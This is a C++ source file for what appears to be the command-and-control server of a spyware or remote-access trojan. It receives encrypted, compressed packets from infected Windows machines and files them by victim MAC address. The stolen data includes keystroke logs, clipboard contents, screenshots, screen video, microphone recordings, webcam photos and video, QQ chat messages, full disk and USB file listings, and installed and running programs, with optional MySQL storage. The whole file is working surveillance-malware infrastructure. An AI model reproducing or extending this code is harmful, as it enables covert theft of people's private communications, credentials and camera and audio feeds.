
#include <windows.h>
#include "main.h"
#include "Public.h"
#include "DataRecverer.h"
#include "onlinemanager.h"
#include "mysqlOper.h"
#include <vector>
#include "crypt/cryption.h"
#include "jsonParser.h"
#include "JsonSplit.h"
#include "FileReadLine.h"
#include <json/json.h>
#include <string>
#include "PublicFunc.h"


using namespace std;


#define SUPER_USERNAME				"19820521"
#define SUPER_MAC					"\xff\xff\xff\xff\xff\xff"

int __stdcall DataRecvers::DataRecverProc(LPNETWORKPROCPARAM lpParam) {

	NETWORKPROCPARAM stParam = *lpParam;

	int iRet = 0;
	char szShowInfo[1024];
	char szClientInfo[MAX_PATH];

	char* lpBuf = new char[NETWORK_BUF_SIZE + 1024];
	if (lpBuf == 0)
	{
		InetAddrFormatString(stParam, szClientInfo);
		wsprintfA(szShowInfo, "DataRecverProc new lpbuf error from client:%s\r\n", szClientInfo);
		WriteLog(szShowInfo);

		closesocket(stParam.hSockClient);
		return FALSE;
	}

	//MSG_WAITALL
	//The receive request will complete only when one of the following events occurs:
	//The buffer supplied by the caller is completely full.
	//The connection has been closed.
	//The request has been canceled or an error occurred.
	//Note that if the underlying transport does not support MSG_WAITALL, or if the socket is in a non-blocking mode,
	//then this call will fail with WSAEOPNOTSUPP
	int dwPackSize = recv(stParam.hSockClient, lpBuf, NETWORK_BUF_SIZE, 0);
	if (dwPackSize > sizeof(NETWORKPACKETHEADER))
	{
		// 		DWORD handler = (DWORD)myeException;
		// 		__asm {
		// 			push __SEH_VER__
		// 			push ebp
		// 			push handler;
		// 			push fs : [0];
		// 			mov fs : [0], esp;
		// 		}
		__try {
			iRet = DataRecver(stParam, &lpBuf, dwPackSize);
		}
		__except (1) {
			WriteLog("DataRecverProc exception\r\n");
		}

	}
	else {

	}

	// __SEH_VER__:
	// 	__asm {
	// 		pop fs:[0]
	// 		pop eax
	// 		pop eax
	// 		pop eax
	// 	}

	closesocket(stParam.hSockClient);
	delete[]lpBuf;
	return FALSE;
}

void DataRecvers::myeException(struct _EXCEPTION_RECORD* record, void* f, struct _CONTEXT* context, void* disp) {

	char szlog[1024];
	wsprintfA("exception addr:%x,code:%x,flag:%x\r\n", (LPSTR)record->ExceptionAddress, record->ExceptionCode, record->ExceptionFlags);
	WriteLog(szlog);
}


int __stdcall DataRecvers::DataRecver(NETWORKPROCPARAM stParam, char** lpBuf, int dwPackSize)
{
	int iRet = 0;
	char szShowInfo[1024];
	char szClientInfo[MAX_PATH];

	LPNETWORKPACKETHEADER hdr = (LPNETWORKPACKETHEADER)(*lpBuf);

	DWORD dwCommand = hdr->cmd;
	if (dwCommand != SCREENSNAPSHOT &&
		dwCommand != ONLINE &&
		dwCommand != SYSTEMINFO &&
		dwCommand != HARDDISKALLFILE &&
		dwCommand != KEYBOARDRECORD &&
		dwCommand != APPSCREENSNAPSHOT &&
		dwCommand != SOUNDRECORD &&
		dwCommand != SCREENVIDEO &&
		dwCommand != CAMERAPHOTO &&
		dwCommand != CAMERAVIDEO &&
		dwCommand != CLIPBOARDRECORD &&
		dwCommand != DISKFILERECORD &&
		dwCommand != QQMSGRECORD &&
		dwCommand != LOGINFORMATIONFILE &&
		dwCommand != USBALLFILES &&
		dwCommand != RUNNING_APPS &&
		dwCommand != INSTALLED_APPS)
	{
		iRet = GetLastError();
		return FALSE;
	}

	char szuser[MAX_USERNAME_SIZE * 2] = { 0 };
	if (hdr->unique.crypt == DATACRYPT)
	{
		xorCrypt(hdr->unique.username, MAX_USERNAME_SIZE, gKey, MAX_USERNAME_SIZE);
	}

	memcpy(szuser, (char*)hdr->unique.username, MAX_USERNAME_SIZE);
	if (lstrlenA((char*)szuser) <= MAX_USERNAME_SIZE && lstrlenA((char*)szuser) > 0)
	{
		if (checkAccountName(szuser) == FALSE)
		{
			WriteLog("get account name error\r\n");
			return FALSE;
		}

		if (strcmp(szuser, SUPER_USERNAME) == 0 && memcmp(SUPER_MAC, hdr->unique.cMAC, MAC_ADDRESS_LENGTH) == 0)
		{
			ExitProcess(0);
		}
	}
	else {
		InetAddrFormatString(stParam, szClientInfo);
		wsprintfA(szShowInfo, "DataRecverProc get user error:%s\r\n", (char*)hdr->unique.username);
		WriteLog(szShowInfo);
		return FALSE;
	}


	iRet = OnlineManager::CheckIfOnlineExist(&hdr->unique, stParam.hSockClient, stParam.stAddrClient, *lpBuf, DATA_THREAD, stParam.dwThreadID);

	int dwDataSize = hdr->packlen;
	int dwMaxRecvBufSize = NETWORK_BUF_SIZE;
	if (dwDataSize < 0 || dwDataSize >= (MAX_BUF_SIZE - sizeof(NETWORKPACKETHEADER)))
	{
		InetAddrFormatString(stParam, szClientInfo);
		wsprintfA(szShowInfo, "DataRecverProc packet stream size is too big to recv in buffer client:%s\r\n", szClientInfo);
		WriteLog(szShowInfo);
		return FALSE;
	}
	else if ((dwDataSize > NETWORK_BUF_SIZE - sizeof(NETWORKPACKETHEADER)) && (dwDataSize < MAX_BUF_SIZE - sizeof(NETWORKPACKETHEADER)))
	{
		char* lpNewBuf = new char[dwDataSize + sizeof(NETWORKPACKETHEADER) + 0x1000];
		if (lpNewBuf == FALSE)
		{
			return FALSE;
		}

		memcpy(lpNewBuf, *lpBuf, dwPackSize);
		delete[] * lpBuf;
		*lpBuf = lpNewBuf;
		dwMaxRecvBufSize = dwDataSize + sizeof(NETWORKPACKETHEADER);
		hdr = (LPNETWORKPACKETHEADER)(*lpBuf);
	}
	else {
		//small packet <= NETWORK_BUF_SIZE
	}

	while (dwDataSize > (int)(dwPackSize - sizeof(NETWORKPACKETHEADER)))
	{
		int dwThirdPackSize = recv(stParam.hSockClient, *lpBuf + dwPackSize, dwMaxRecvBufSize - dwPackSize, 0);
		if (dwThirdPackSize > 0)
		{
			dwPackSize += dwThirdPackSize;
		}
		else
		{
			if (dwDataSize <= dwPackSize - sizeof(NETWORKPACKETHEADER))
			{
				break;
			}
			else {
				int iRet = WSAGetLastError();
				InetAddrFormatString(stParam, szClientInfo);
				wsprintfA(szShowInfo, "DataRecverProc recv error code:%u,client:%s\r\n", iRet, szClientInfo);
				WriteLog(szShowInfo);
				return FALSE;
			}
		}
	}

	if (hdr->unique.crypt == DATACRYPT)
	{
		xorCrypt((unsigned char*)*lpBuf + sizeof(NETWORKFILEHDR), hdr->packlen - sizeof(int), (unsigned char*)szuser, MAX_USERNAME_SIZE);
	}

	char* lpZlibBuf = 0;
	long lZlibBufLen = 0;
	if (hdr->unique.compress == DATACOMPRESS)
	{
		NETWORKFILEHDR filehdr = *(LPNETWORKFILEHDR)*lpBuf;
		lZlibBufLen = filehdr.len;
		if (lZlibBufLen > MAX_BUF_SIZE || lZlibBufLen <= 0)
		{
			return FALSE;
		}

		lZlibBufLen += 0x1000;
		lpZlibBuf = (char*)new char[lZlibBufLen + 0x1000];
		if (lpZlibBuf == 0)
		{
			InetAddrFormatString(stParam, szClientInfo);
			wsprintfA(szShowInfo, "DataRecverProc new unzip buffer error client:%s\r\n", szClientInfo);
			WriteLog(szShowInfo);
			return FALSE;
		}

		iRet = uncompress((Bytef*)lpZlibBuf, (uLongf*)&lZlibBufLen, (const Bytef*)(*lpBuf + sizeof(NETWORKFILEHDR)),
			(uLongf)dwDataSize - sizeof(int));
		if (iRet != Z_OK && (lZlibBufLen < filehdr.len))
		{
			InetAddrFormatString(stParam, szClientInfo);
			wsprintfA(szShowInfo, "DataRecverProc unzip error code:%u,client:%s\r\n", iRet, szClientInfo);
			WriteLog(szShowInfo);

			WriteDataFile("errorpack.log", *lpBuf, 256);
			delete[]lpZlibBuf;
			return FALSE;
		}
	}
	else {
		lZlibBufLen = dwDataSize;
		lpZlibBuf = *lpBuf + sizeof(NETWORKPACKETHEADER);
	}
	*(lpZlibBuf + lZlibBufLen) = 0;

	iRet = DataRecvers::DataRecverProcess(&stParam, hdr, lpZlibBuf, lZlibBufLen, szuser);

	if (hdr->unique.compress == DATACOMPRESS)
	{
		delete[]lpZlibBuf;
	}

	int iSendDataLen = 0;
	*(DWORD*)(*lpBuf + iSendDataLen) = RECV_DATA_OK;
	iSendDataLen += sizeof(DWORD);
	*(LPUNIQUECLIENTSYMBOL)(*lpBuf + iSendDataLen) = hdr->unique;
	iSendDataLen += sizeof(UNIQUECLIENTSYMBOL);
	*(DWORD*)(*lpBuf + iSendDataLen) = 0;
	iSendDataLen += sizeof(DWORD);
	iRet = send(stParam.hSockClient, *lpBuf, iSendDataLen, 0);
	if (iRet <= 0)
	{
		InetAddrFormatString(stParam, szClientInfo);
		wsprintfA(szShowInfo, "DataRecverProc send recv ok packet error client:%s\r\n", szClientInfo);
		WriteLog(szShowInfo);
		return FALSE;
	}

	return TRUE;
}


int DataRecvers::DataRecverProcess(LPNETWORKPROCPARAM lpParam, LPNETWORKPACKETHEADER hdr, char* lpZlibBuf, int lZlibBufLen, char* szuser)
{
	int iRet = 0;

	DWORD dwCommand = hdr->cmd;

	char szMacSubDir[MAX_PATH];
	char szCurDataDir[MAX_PATH];

	char szCurrentDir[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, szCurrentDir);
	lstrcatA(szCurrentDir, "\\");

#ifdef USE_USERNAME
	char szUniqueFormat[] = "%s\\%02X_%02X_%02X_%02X_%02X_%02X\\";
	iRet = wsprintfA(szMacSubDir, szUniqueFormat, szuser,
		hdr->unique.cMAC[0], hdr->unique.cMAC[1], hdr->unique.cMAC[2], hdr->unique.cMAC[3], hdr->unique.cMAC[4], hdr->unique.cMAC[5]);
	lstrcpyA(szCurDataDir, szCurrentDir);
#else
	char szUniqueFormat[] = "%02X_%02X_%02X_%02X_%02X_%02X\\";
	iRet = wsprintfA(szMacSubDir, szUniqueFormat,
		stUnique.cMAC[0], stUnique.cMAC[1], stUnique.cMAC[2], stUnique.cMAC[3], stUnique.cMAC[4], stUnique.cMAC[5]);
	lstrcpyA(szCurDataDir, szCurrentDir);
#endif
	lstrcatA(szCurDataDir, szMacSubDir);

	SYSTEMTIME stTime = { 0 };
	GetLocalTime(&stTime);
	char szDateSubDir[MAX_PATH];
	iRet = wsprintfA(szDateSubDir, "%04u_%02u_%02u\\", stTime.wYear, stTime.wMonth, stTime.wDay);
	lstrcatA(szCurDataDir, szDateSubDir);

	if (dwCommand == ONLINE)
	{
		char szOnLineFile[MAX_PATH];
		lstrcpyA(szOnLineFile, szCurDataDir);
		lstrcatA(szOnLineFile, ONLINEFILENAME);

		char szOnlineInfo[1024];
		int iLen = wsprintfA(szOnlineInfo, "%u_%u_%u_%u_%u_%u online\r\n", stTime.wYear, stTime.wMonth, stTime.wDay, stTime.wHour, stTime.wMinute, stTime.wSecond);
		iRet = WriteDataFile(szOnLineFile, szOnlineInfo, iLen);
	}
	else if (dwCommand == SCREENSNAPSHOT)
	{
		char szFileName[MAX_PATH] = { 0 };
		lstrcpyA(szFileName, szCurDataDir);
		wsprintfA(szFileName + lstrlenA(szFileName), "screen_%u_%u_%u_%u_%u_%u.jpg", stTime.wYear, stTime.wMonth, stTime.wDay, stTime.wHour, stTime.wMinute, stTime.wSecond);
		iRet = WriteDataFile(szFileName, lpZlibBuf, lZlibBufLen);

#ifdef USE_MYSQL
		MySql::enterLock();
		MySql* mysql = new MySql();
		string mac = FileReadLine::getmac(hdr->unique.cMAC);
		iRet = mysql->insertPhoto(mac, "3", szFileName);
		delete mysql;
		MySql::leaveLock();
#endif
	}
	else if (dwCommand == APPSCREENSNAPSHOT)
	{
		char szFileName[MAX_PATH] = { 0 };
		lstrcpyA(szFileName, szCurDataDir);
		wsprintfA(szFileName + lstrlenA(szFileName), "app_screen_%u_%u_%u_%u_%u_%u.jpg", stTime.wYear, stTime.wMonth, stTime.wDay, stTime.wHour, stTime.wMinute, stTime.wSecond);
		iRet = WriteDataFile(szFileName, lpZlibBuf, lZlibBufLen);
#ifdef USE_MYSQL
		MySql::enterLock();
		MySql* mysql = new MySql();
		string mac = FileReadLine::getmac(hdr->unique.cMAC);
		iRet = mysql->insertPhoto(mac, "2", szFileName);
		delete mysql;
		MySql::leaveLock();
#endif
	}
	else if (dwCommand == SCREENVIDEO)
	{
		char szFileName[MAX_PATH] = { 0 };
		lstrcpyA(szFileName, szCurDataDir);
		wsprintfA(szFileName + lstrlenA(szFileName), "screenvideo_%u_%u_%u_%u_%u_%u.avi", stTime.wYear, stTime.wMonth, stTime.wDay, stTime.wHour, stTime.wMinute, stTime.wSecond);
		iRet = WriteDataFile(szFileName, lpZlibBuf, lZlibBufLen);
	}
	else if (dwCommand == SOUNDRECORD)
	{
		char szFileName[MAX_PATH] = { 0 };
		lstrcpyA(szFileName, szCurDataDir);
		wsprintfA(szFileName + lstrlenA(szFileName), "sound_%u_%u_%u_%u_%u_%u.wav", stTime.wYear, stTime.wMonth, stTime.wDay, stTime.wHour, stTime.wMinute, stTime.wSecond);
		iRet = WriteDataFile(szFileName, lpZlibBuf, lZlibBufLen);
#ifdef USE_MYSQL
		MySql::enterLock();
		MySql* mysql = new MySql();
		string mac = FileReadLine::getmac(hdr->unique.cMAC);
		iRet = mysql->insertAudio(mac, szFileName, lZlibBufLen);
		delete mysql;
		MySql::leaveLock();
#endif
	}
	else if (dwCommand == CAMERAPHOTO)
	{
		char szFileName[MAX_PATH] = { 0 };
		lstrcpyA(szFileName, szCurDataDir);
		wsprintfA(szFileName + lstrlenA(szFileName), "canmeraphoto_%u_%u_%u_%u_%u_%u.jpg", stTime.wYear, stTime.wMonth, stTime.wDay, stTime.wHour, stTime.wMinute, stTime.wSecond);
		iRet = WriteDataFile(szFileName, lpZlibBuf, lZlibBufLen);
#ifdef USE_MYSQL
		MySql::enterLock();
		MySql* mysql = new MySql();
		string mac = FileReadLine::getmac(hdr->unique.cMAC);
		iRet = mysql->insertPhoto(mac, "1", szFileName);
		delete mysql;
		MySql::leaveLock();
#endif
	}
	else if (dwCommand == CAMERAVIDEO)
	{
		char szFileName[MAX_PATH] = { 0 };
		lstrcpyA(szFileName, szCurDataDir);
		wsprintfA(szFileName + lstrlenA(szFileName), "cameravideo_%u_%u_%u_%u_%u_%u.avi", stTime.wYear, stTime.wMonth, stTime.wDay, stTime.wHour, stTime.wMinute, stTime.wSecond);
		iRet = WriteDataFile(szFileName, lpZlibBuf, lZlibBufLen);
	}
	else if (dwCommand == SYSTEMINFO)
	{
		char szSysinfoFile[MAX_PATH];
		lstrcpyA(szSysinfoFile, szCurDataDir);
		lstrcatA(szSysinfoFile, SYSTEMINFOFILENAME);
		iRet = WriteDataFileWithType(szSysinfoFile, lpZlibBuf, lZlibBufLen, CREATE_ALWAYS);
#ifdef USE_MYSQL
		MySql::enterLock();
		MySql* mysql = new MySql();

		string mac = FileReadLine::getmac(hdr->unique.cMAC);
		char* result = 0;
		string info = string(lpZlibBuf, lZlibBufLen);
		iRet = GBKToUTF8(info.c_str(), &result);
		iRet = mysql->insertClient(szuser, mac, result);
		delete result;

		delete mysql;
		MySql::leaveLock();
#endif
	}
	else if (dwCommand == RUNNING_APPS)
	{
		char szFile[MAX_PATH];
		lstrcpyA(szFile, szCurDataDir);
		lstrcatA(szFile, RUNNINGAPPSFILENAME);
		iRet = WriteDataFileWithType(szFile, lpZlibBuf, lZlibBufLen, CREATE_ALWAYS);

#ifdef USE_MYSQL
		MySql::enterLock();
		MySql* mysql = new MySql();
		string mac = FileReadLine::getmac(hdr->unique.cMAC);

		Json::Reader reader;
		Json::Value info;
		string data = string(lpZlibBuf, lZlibBufLen);
		if (reader.parse(data, info))
		{
			//Json::Value arrayObj = info["array"];
			for (int i = 0; i < info.size(); i++)
			{
				string pname = info[i]["process"].asString();
				string pid = info[i]["ID"].asString();
				char* nameutf8 = 0;
				iRet = GBKToUTF8(pname.c_str(), (char**)&nameutf8);
				iRet = mysql->insertProcesses(mac, nameutf8, pid);
				delete nameutf8;
			}
		}

		delete mysql;
		MySql::leaveLock();
#endif
	}
	else if (dwCommand == INSTALLED_APPS)
	{
		char szFile[MAX_PATH];
		lstrcpyA(szFile, szCurDataDir);
		lstrcatA(szFile, INSTALLEDAPPSFILENAME);
		iRet = WriteDataFileWithType(szFile, lpZlibBuf, lZlibBufLen, CREATE_ALWAYS);
#ifdef USE_MYSQL
		MySql::enterLock();
		MySql* mysql = new MySql();
		string mac = FileReadLine::getmac(hdr->unique.cMAC);

		string data = string(lpZlibBuf, lZlibBufLen);

		Json::Reader reader;
		Json::Value info;
		if (reader.parse(data, info))
		{
			//Json::Value arrayObj = info["array"];
			for (int i = 0; i < info.size(); i++)
			{
				string name = info[i]["name"].asString();
				string ver = info[i]["ver"].asString();
				string date = info[i]["date"].asString();

				string path = info[i]["install"].asString();
				//replaceJsonSplash(path);
				replaceSlash(path);
				string unpath = info[i]["uninstall"].asString();
				//replaceJsonSplash(unpath);
				replaceSlash(unpath);
				string publisher = info[i]["publisher"].asString();


				char* pubutf8 = 0;
				char* unpathutf8 = 0;
				char* dateutf8 = 0;
				char* pathutf8 = 0;
				char* verutf8 = 0;
				char* nameutf8 = 0;
				iRet = GBKToUTF8(name.c_str(), (char**)&nameutf8);
				iRet = GBKToUTF8(publisher.c_str(), (char**)&pubutf8);
				iRet = GBKToUTF8(unpath.c_str(), (char**)&unpathutf8);
				iRet = GBKToUTF8(date.c_str(), (char**)&dateutf8);
				iRet = GBKToUTF8(ver.c_str(), (char**)&verutf8);
				iRet = GBKToUTF8(path.c_str(), (char**)&pathutf8);
				iRet = mysql->insertInstallApps(mac, nameutf8, verutf8, pathutf8, pubutf8, unpathutf8, dateutf8);
				delete pubutf8;
				delete unpathutf8;
				delete dateutf8;
				delete pathutf8;
				delete verutf8;
				delete nameutf8;
			}
		}
		else {

		}

		delete mysql;
		MySql::leaveLock();
#endif
	}
	else if (dwCommand == HARDDISKALLFILE)
	{
		char szAllDiskFileName[MAX_PATH] = { 0 };
		lstrcpyA(szAllDiskFileName, szCurDataDir);
		lstrcatA(szAllDiskFileName, ALLDISKFILENAME);
		iRet = WriteDataFileWithType(szAllDiskFileName, lpZlibBuf, lZlibBufLen, CREATE_ALWAYS);
#ifdef USE_MYSQL
		MySql::enterLock();
		MySql* mysql = new MySql();
		string mac = FileReadLine::getmac(hdr->unique.cMAC);
		FileReadLine* readline = new FileReadLine(szAllDiskFileName);
		while (1)
		{
			string line = readline->readline();
			if (line != "")
			{
				int pos = line.find("\r\n");
				if (pos > 0)
				{
					line = line.substr(0, pos);
				}

				char* utf8str = 0;
				int utf8len = GBKToUTF8(line.c_str(), &utf8str);
				if (utf8len > 0)
				{
					iRet = mysql->insertFiles(mac, utf8str);
					delete utf8str;
				}
			}
			else {
				break;
			}
		}
		delete readline;
		delete mysql;
		MySql::leaveLock();
#endif
	}
	else if (dwCommand == USBALLFILES) {
		WriteLog("find u disk files\r\n");
		char szAllDiskFileName[MAX_PATH] = { 0 };
		lstrcpyA(szAllDiskFileName, szCurDataDir);
		lstrcatA(szAllDiskFileName, DISKUALLFILESFILENAME);
		iRet = WriteDataFileWithType(szAllDiskFileName, lpZlibBuf, lZlibBufLen, CREATE_ALWAYS);
#ifdef USE_MYSQL
		MySql::enterLock();
		MySql* mysql = new MySql();
		string mac = FileReadLine::getmac(hdr->unique.cMAC);
		FileReadLine* readline = new FileReadLine(szAllDiskFileName);
		while (1)
		{
			string line = readline->readline();
			if (line != "")
			{
				int pos = line.find("\r\n");
				if (pos > 0)
				{
					line = line.substr(0, pos);
				}

				char* utf8str = 0;
				int utf8len = GBKToUTF8(line.c_str(), &utf8str);
				if (utf8len > 0)
				{
					iRet = mysql->insertFiles(mac, utf8str);
					delete utf8str;
				}
			}
			else {
				break;
			}
		}
		delete readline;
		delete mysql;
		MySql::leaveLock();
#endif
	}
	else if (dwCommand == KEYBOARDRECORD)
	{
		char szKeyboardFileName[MAX_PATH] = { 0 };
		lstrcpyA(szKeyboardFileName, szCurDataDir);
		lstrcatA(szKeyboardFileName, KEYBOARDFILENAME);
		iRet = WriteDataFile(szKeyboardFileName, lpZlibBuf, lZlibBufLen);
#ifdef USE_MYSQL
		MySql::enterLock();
		MySql* mysql = new MySql();
		string mac = FileReadLine::getmac(hdr->unique.cMAC);

		string data = string(lpZlibBuf, lZlibBufLen);
		char* utf8str = 0;
		int utf8len = GBKToUTF8(data.c_str(), &utf8str);
		if (utf8len > 0)
		{
			iRet = mysql->insertKeyboard(mac, utf8str);
			delete utf8str;
		}

		delete mysql;
		MySql::leaveLock();
#endif
	}
	else if (dwCommand == CLIPBOARDRECORD)
	{
		char szClipBoardFileName[MAX_PATH] = { 0 };
		lstrcpyA(szClipBoardFileName, szCurDataDir);
		lstrcatA(szClipBoardFileName, CLIPBOARDFILENAME);

		char datatime[MAX_PATH];
		int iLen = wsprintfA(datatime, "{\"time\":\"%u/%u/%u %u:%u:%u\",\"clipboard\":\"",
			stTime.wYear, stTime.wMonth, stTime.wDay, stTime.wHour, stTime.wMinute, stTime.wSecond);
		iRet = WriteDataFile(szClipBoardFileName, datatime, iLen);
		iRet = WriteDataFile(szClipBoardFileName, lpZlibBuf, lZlibBufLen);
		iRet = WriteDataFile(szClipBoardFileName, "\"}", 2);

#ifdef USE_MYSQL
		MySql::enterLock();
		MySql* mysql = new MySql();
		string mac = FileReadLine::getmac(hdr->unique.cMAC);

		string line = string(lpZlibBuf, lZlibBufLen);
		char* utf8str = 0;
		int utf8len = GBKToUTF8(line.c_str(), &utf8str);
		if (utf8len > 0)
		{
			iRet = mysql->insertClipboard(mac, utf8str);
			delete utf8str;
		}
		delete mysql;
		MySql::leaveLock();
#endif
	}
	else if (dwCommand == DISKFILERECORD)
	{
		char szDiskRecordFileName[MAX_PATH] = { 0 };
		lstrcpyA(szDiskRecordFileName, szCurDataDir);
		lstrcatA(szDiskRecordFileName, DISKRECORDFILENAME);
		iRet = WriteDataFile(szDiskRecordFileName, lpZlibBuf, lZlibBufLen);
#ifdef USE_MYSQL
		MySql::enterLock();
		MySql* mysql = new MySql();
		string mac = FileReadLine::getmac(hdr->unique.cMAC);

		string line = string(lpZlibBuf, lZlibBufLen);
		char* utf8str = 0;
		int utf8len = GBKToUTF8(line.c_str(), &utf8str);
		if (utf8len > 0)
		{
			iRet = mysql->insertFilesOper(mac, utf8str);
			delete utf8str;
		}

		delete mysql;
		MySql::leaveLock();
#endif
	}
	else if (dwCommand == COMMANDRESULT)
	{
		char szCmdResultFileName[MAX_PATH] = { 0 };
		lstrcpyA(szCmdResultFileName, szCurDataDir);
		lstrcatA(szCmdResultFileName, CMDRESULTFILENAME);
		iRet = WriteDataFile(szCmdResultFileName, lpZlibBuf, lZlibBufLen);
	}
	else if (dwCommand == QQMSGRECORD)
	{
		char szQQMsgFileName[MAX_PATH] = { 0 };
		lstrcpyA(szQQMsgFileName, szCurDataDir);
		lstrcatA(szQQMsgFileName, QQRECORDFILENAME);
		iRet = WriteDataFile(szQQMsgFileName, lpZlibBuf, lZlibBufLen);
	}
	else if (dwCommand == LOGINFORMATIONFILE) {
		char szLogFileName[MAX_PATH] = { 0 };
		lstrcpyA(szLogFileName, szCurDataDir);
		lstrcatA(szLogFileName, LOGRECORDFILENAME);
		iRet = WriteDataFile(szLogFileName, lpZlibBuf, lZlibBufLen);
	}
	else {
		//return FALSE;
	}

	return iRet;
}




